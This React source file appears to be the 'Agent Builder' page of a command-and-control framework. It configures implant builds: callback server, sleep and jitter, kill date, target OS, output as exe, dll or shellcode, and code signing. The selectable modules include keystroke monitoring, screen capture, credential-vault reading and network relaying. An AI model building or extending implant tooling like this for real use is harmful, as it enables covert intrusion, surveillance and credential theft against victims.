import React, { useState } from 'react';
import { api } from '../api';

const MODULES = [
  'Terminal Session', 'Storage Browser', 'Task Viewer', 'Display Capture',
  'Input Monitor', 'Vault Reader', 'Config Store', 'Service Manager',
  'Network Relay', 'Package Loader', 'Cleanup',
];

export default function Builder() {
  const [form, setForm] = useState({
    server_url: 'https://cdn.example.com:443',
    encryption_key: '',
    sleep: 5,
    jitter: 20,
    kill_date: '',
    working_hours_start: '',
    working_hours_end: '',
    target_os: 'windows',
    target_arch: 'x64',
    modules: MODULES.slice(0, 10),
    output_format: 'exe',
    code_sign: false,
    azure_tenant_id: '',
    azure_client_id: '',
    azure_client_secret: '',
    azure_endpoint: '',
    azure_account_name: '',
    azure_cert_profile: '',
  });
  const [buildStatus, setBuildStatus] = useState(null);
  const [building, setBuilding] = useState(false);

  const generateKey = () => {
    const bytes = new Uint8Array(32);
    crypto.getRandomValues(bytes);
    const key = btoa(String.fromCharCode(...bytes));
    setForm({...form, encryption_key: key});
  };

  const toggleModule = (mod) => {
    if (form.modules.includes(mod)) {
      setForm({...form, modules: form.modules.filter(m => m !== mod)});
    } else {
      setForm({...form, modules: [...form.modules, mod]});
    }
  };

  const build = async () => {
    setBuilding(true);
    setBuildStatus(null);
    try {
      const res = await api.buildAgent(form);
      setBuildStatus(res);
    } catch (err) {
      setBuildStatus({ status: 'error', message: err.message });
    }
    setBuilding(false);
  };

  return (
    <div>
      <div className="page-title">// BUILDER</div>
      <div className="panel">
        <div className="panel-header">Agent Builder</div>
        <div className="panel-body" style={{ maxWidth: 800 }}>
          <div className="form-row">
            <div className="form-group">
              <label className="form-label">Server URL</label>
              <input type="text" className="form-input" value={form.server_url} onChange={e => setForm({...form, server_url: e.target.value})} />
            </div>
            <div className="form-group">
              <label className="form-label">Encryption Key</label>
              <div style={{ display: 'flex', gap: 8 }}>
                <input type="text" className="form-input" value={form.encryption_key} onChange={e => setForm({...form, encryption_key: e.target.value})} style={{ color: 'var(--green)' }} />
                <button className="btn btn-sm" onClick={generateKey}>GEN</button>
              </div>
            </div>
          </div>
          <div className="form-row">
            <div className="form-group">
              <label className="form-label">Sleep (seconds)</label>
              <input type="number" className="form-input" value={form.sleep} onChange={e => setForm({...form, sleep: parseInt(e.target.value)})} />
            </div>
            <div className="form-group">
              <label className="form-label">Jitter (%)</label>
              <input type="number" className="form-input" value={form.jitter} onChange={e => setForm({...form, jitter: parseInt(e.target.value)})} />
            </div>
          </div>
          <div className="form-row">
            <div className="form-group">
              <label className="form-label">Kill Date (optional)</label>
              <input type="date" className="form-input" value={form.kill_date} onChange={e => setForm({...form, kill_date: e.target.value})} />
            </div>
            <div className="form-group">
              <label className="form-label">Working Hours (optional)</label>
              <div style={{ display: 'flex', gap: 8, alignItems: 'center' }}>
                <input type="time" className="form-input" value={form.working_hours_start} onChange={e => setForm({...form, working_hours_start: e.target.value})} style={{ width: 'auto' }} />
                <span style={{ color: 'var(--text-muted)' }}>to</span>
                <input type="time" className="form-input" value={form.working_hours_end} onChange={e => setForm({...form, working_hours_end: e.target.value})} style={{ width: 'auto' }} />
              </div>
            </div>
          </div>

          <div className="form-group">
            <label className="form-label">Target OS</label>
            <div className="radio-group">
              {['windows','linux','macos'].map(os => (
                <span key={os} className={`radio-item ${form.target_os === os ? 'selected' : ''}`} onClick={() => setForm({...form, target_os: os})}>{os.toUpperCase()}</span>
              ))}
            </div>
          </div>

          <div className="form-group">
            <label className="form-label">Target Architecture</label>
            <div className="radio-group">
              {['x64','x86','arm64'].map(arch => (
                <span key={arch} className={`radio-item ${form.target_arch === arch ? 'selected' : ''}`} onClick={() => setForm({...form, target_arch: arch})}>{arch.toUpperCase()}</span>
              ))}
            </div>
          </div>

          <div className="form-group">
            <label className="form-label">Modules</label>
            <div className="checkbox-group">
              {MODULES.map(mod => (
                <span key={mod} className={`checkbox-item ${form.modules.includes(mod) ? 'checked' : ''}`} onClick={() => toggleModule(mod)}>
                  {form.modules.includes(mod) ? '✓ ' : ''}{mod}
                </span>
              ))}
            </div>
          </div>

          <div className="form-group">
            <label className="form-label">Output Format</label>
            <div className="radio-group">
              {['exe','dll','shellcode'].map(fmt => (
                <span key={fmt} className={`radio-item ${form.output_format === fmt ? 'selected' : ''}`} onClick={() => setForm({...form, output_format: fmt})}>{fmt.toUpperCase()}</span>
              ))}
            </div>
          </div>

          {/* CODE SIGNING */}
          <div className="form-group" style={{ marginTop: 24, paddingTop: 16, borderTop: '1px solid var(--border)' }}>
            <label className="form-label">Code Signing</label>
            <div className="radio-group">
              <span className={`radio-item ${!form.code_sign ? 'selected' : ''}`} onClick={() => setForm({...form, code_sign: false})}>DISABLED</span>
              <span className={`radio-item ${form.code_sign ? 'selected' : ''}`} onClick={() => setForm({...form, code_sign: true})}>ENABLED</span>
            </div>
          </div>

          {form.code_sign && (
            <div style={{ marginTop: 16, padding: 16, border: '1px solid var(--border)', background: 'var(--surface)' }}>
              <div className="form-row">
                <div className="form-group">
                  <label className="form-label">Azure Tenant ID</label>
                  <input type="text" className="form-input" value={form.azure_tenant_id} onChange={e => setForm({...form, azure_tenant_id: e.target.value})} />
                </div>
                <div className="form-group">
                  <label className="form-label">Azure Client ID</label>
                  <input type="text" className="form-input" value={form.azure_client_id} onChange={e => setForm({...form, azure_client_id: e.target.value})} />
                </div>
              </div>
              <div className="form-row">
                <div className="form-group">
                  <label className="form-label">Azure Client Secret</label>
                  <input type="text" className="form-input" value={form.azure_client_secret} onChange={e => setForm({...form, azure_client_secret: e.target.value})} />
                </div>
                <div className="form-group">
                  <label className="form-label">Endpoint</label>
                  <input type="text" className="form-input" value={form.azure_endpoint} onChange={e => setForm({...form, azure_endpoint: e.target.value})} />
                </div>
              </div>
              <div className="form-row">
                <div className="form-group">
                  <label className="form-label">Account Name</label>
                  <input type="text" className="form-input" value={form.azure_account_name} onChange={e => setForm({...form, azure_account_name: e.target.value})} />
                </div>
                <div className="form-group">
                  <label className="form-label">Certificate Profile</label>
                  <input type="text" className="form-input" value={form.azure_cert_profile} onChange={e => setForm({...form, azure_cert_profile: e.target.value})} />
                </div>
              </div>
            </div>
          )}

          <div style={{ marginTop: 24, paddingTop: 16, borderTop: '1px solid var(--border)' }}>
            <button className="btn btn-green" style={{ fontSize: 12, padding: '12px 32px' }} onClick={build} disabled={building}>
              {building ? 'BUILDING...' : 'BUILD AGENT'}
            </button>
          </div>

          {buildStatus && (
            <div style={{ marginTop: 16, padding: 12, border: '1px solid var(--border)', background: 'var(--term-bg)', fontFamily: 'var(--font-mono)', fontSize: 11, color: buildStatus.status === 'error' ? 'var(--red)' : 'var(--text-muted)' }}>
              <span style={{ color: buildStatus.status === 'error' ? 'var(--red)' : 'var(--green)' }}>
                {buildStatus.status === 'error' ? '✕' : '✓'}
              </span>{' '}
              {buildStatus.message || `Build ${buildStatus.build_id} — ${buildStatus.status}`}
            </div>
          )}
        </div>
      </div>
    </div>
  );
}
